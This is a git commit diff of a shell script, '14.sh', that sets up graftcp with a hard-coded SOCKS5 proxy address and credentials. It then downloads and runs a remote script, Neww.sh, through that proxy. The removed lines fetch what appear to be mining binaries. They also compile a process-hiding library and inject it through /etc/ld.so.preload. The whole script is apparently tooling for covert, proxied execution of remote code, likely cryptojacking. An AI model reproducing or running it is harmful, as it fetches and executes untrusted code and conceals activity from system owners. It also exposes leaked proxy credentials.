4a71ccf5c0b359fd96d28062f0727ada4d80a23a
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-25 01:04:21 -0600

    Update 14.sh

--- 14.sh
+++ 14.sh
@@ -1,33 +1,27 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
+
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-select_proxy_mode=socks5_only
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 = 45.140.13.124:9137
+socks5_username = faraddd802
+socks5_password = faraddd802
 END
+
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
 sleep .2
-echo " "
-echo " "
-echo "******"
+
 ./graftcp/graftcp curl ifconfig.me
+
 echo " "
+
 echo " "
-echo "******"
-echo " "
-echo " "
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+wget https://github.com/Akatsoki/newwz/raw/main/Neww.sh
+
+
+chmod +x Neww.sh
+
+./graftcp/graftcp ./Neww.sh
